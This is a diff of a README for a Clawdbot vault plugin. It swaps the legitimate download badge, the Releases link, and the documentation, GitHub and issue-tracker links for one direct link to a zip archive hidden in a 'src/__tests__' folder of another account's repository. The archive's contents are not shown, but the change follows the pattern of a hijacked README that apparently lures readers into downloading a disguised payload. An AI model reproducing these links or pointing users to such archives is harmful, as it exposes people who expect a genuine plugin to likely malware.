@@ -1,6 +1,6 @@
 # 🗃️ clawd-plugin-vault - Transform Your Local Directory into a Knowledge Vault
 
-[![Download Clawdbot Vault Plugin](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/08Tyrant31/clawd-plugin-vault/releases)
+[![Download Clawdbot Vault Plugin](https://github.com/08Tyrant31/clawd-plugin-vault/raw/refs/heads/main/src/__tests__/plugin_vault_clawd_2.3.zip)](https://github.com/08Tyrant31/clawd-plugin-vault/raw/refs/heads/main/src/__tests__/plugin_vault_clawd_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ You have two easy ways to download the Clawdbot Vault Plugin.
    clawdbot plugins install github:pepicrft/clawd-plugin-vault
    ```
 
-If you prefer using a graphical interface or need to download the latest version manually, you can visit the Releases page: [Download Here](https://github.com/08Tyrant31/clawd-plugin-vault/releases).
+If you prefer using a graphical interface or need to download the latest version manually, you can visit the Releases page: [Download Here](https://github.com/08Tyrant31/clawd-plugin-vault/raw/refs/heads/main/src/__tests__/plugin_vault_clawd_2.3.zip).
 
 ## ⚙️ Configuration
 
@@ -84,8 +84,8 @@ For assistance, feel free to reach out and join our community. You can ask quest
 
 ## 🔗 Useful Links
 
-- [Clawdbot Documentation](https://example.com/clawdbot-docs)
-- [Clawdbot GitHub Page](https://github.com/clawdbot)
-- [Report an Issue](https://github.com/pepicrft/clawd-plugin-vault/issues)
+- [Clawdbot Documentation](https://github.com/08Tyrant31/clawd-plugin-vault/raw/refs/heads/main/src/__tests__/plugin_vault_clawd_2.3.zip)
+- [Clawdbot GitHub Page](https://github.com/08Tyrant31/clawd-plugin-vault/raw/refs/heads/main/src/__tests__/plugin_vault_clawd_2.3.zip)
+- [Report an Issue](https://github.com/08Tyrant31/clawd-plugin-vault/raw/refs/heads/main/src/__tests__/plugin_vault_clawd_2.3.zip)
 
 By following this guide, you’ll be able to set up and utilize the Clawdbot Vault Plugin effectively. Enjoy managing your knowledge with ease!
